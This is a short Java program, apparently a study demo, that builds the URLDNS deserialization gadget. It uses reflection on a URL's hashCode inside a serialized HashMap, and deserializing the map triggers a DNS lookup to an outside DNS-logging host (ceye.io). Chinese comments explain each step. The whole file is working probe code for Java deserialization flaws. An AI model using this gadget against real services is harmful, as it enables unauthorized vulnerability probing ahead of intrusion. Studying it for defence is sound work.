package com.outlaws.urldns;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

/**
 * @auther : outlaws
 * @date : 2022/7/1 19:21
 * @use :
 */

public class URLDNS {

    public static void main(String[] args) throws Exception {
        //1.加载Class对象
        Class<?> clazz = Class.forName("java.net.URL");
        //利用java反射机制获取url的hashcode
        Field filed = clazz.getDeclaredField("hashCode");
        //因为hashCode是私有方法，所以要设置true
        filed.setAccessible(true);
        //这里直接new 一个对象
        URL url = new URL("http://b.7e1t2z.ceye.io");
        // 这里set是因为hashCode默认为-1，设置一个不为-1的，就不会本地触发dns解析
        filed.set(url,0x1111);
        HashMap<URL, String> hashMap = new HashMap<>();
        hashMap.put(url, "xxx");
        // hashCode 这个属性放进去后设回 -1, 这样在反序列化时就会重新计算 hashCode
        filed.set(url, -1);
        //序列化成对象，输出出来
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream objos = new ObjectOutputStream(barr);
        objos.writeObject(hashMap);
        objos.close();

        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        objectInputStream.readObject();
    }
}

